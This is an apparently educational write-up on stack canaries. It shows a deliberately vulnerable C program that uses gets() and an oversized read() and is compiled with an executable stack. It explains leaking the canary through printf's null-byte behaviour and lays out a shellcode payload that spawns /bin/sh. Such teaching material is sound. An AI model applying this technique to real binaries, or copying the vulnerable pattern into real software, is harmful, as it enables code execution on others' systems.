title : Stack Canary

# Canary as a Sensor
In a classical stack-overflow attack, the attacker overwrites the saved return address with arbitrary codes. To thwart this, modern compilers place a *stack canary* - a small, unpredictable value - between the `saved $rbp` and local stack frame:

To bypass the canary. an attacker should know the exact value. Because the OS randomizes the canary at run time, it usually has to be leaked via another vulnerability or brute-forced.

Below we show how to leak it.

# Leaking the Canary
```c
  1 // Name: r2s.c
  2 // Compile: gcc -o r2s r2s.c -zexecstack
  3
  4 #include <stdio.h>
  5 #include <unistd.h>
  6
  7 void init() {
  8   setvbuf(stdin, 0, 2, 0);
  9   setvbuf(stdout, 0, 2, 0);
 10 }
 11
 12 int main() {
 13   char buf[0x50];
 14
 15   init();
 16
 17   printf("Address of the buf: %p\n", buf);
 18   printf("Distance between buf and $rbp: %ld\n",
 19          (char*)__builtin_frame_address(0) - buf);
 20
 21   printf("[1] Leak the canary\n");
 22   printf("Input: ");
 23   fflush(stdout);
 24
 25   read(0, buf, 0x100);
 26   printf("Your input is '%s'\n", buf);
 27
 28   puts("[2] Overwrite the return address");
 29   printf("Input: ");
 30   fflush(stdout);
 31   gets(buf);
 32
 33   return 0;
 34 }
```

**Key Idea**:
The canary always begins with a null byte `\x00`. Since `printf()` function stops printing at the first null-byte, we can leak the rest of the canary by overwriting that leading null with a non-zero value (such as `'A' == \x41`).

# Crafting the Exploit

Then we can write attack code like this:
```python
payload =
	Shellcode +
	b"A" * (distance_to_canary - len(shellcode)) +
	(b"\x00" + canary) +
	b"B" * 8 +
	p64(ret_addr)
```

- `Shellcode` : Executes `/bin/sh`
- `b"A"` : Padding fills the gap up to the canary
- `\x00 + canary` : Leaked correct canary value w/ null-byte restored
- `b"B"` : Junk value to overwrite `old rbp`
- `p64(ret_addr)` : Return address of our shellcode, here  `&buf`

By reconstructing the canary and supplying this payload, we bypass the stack-canary check and redirect execution to our injected shellcode.
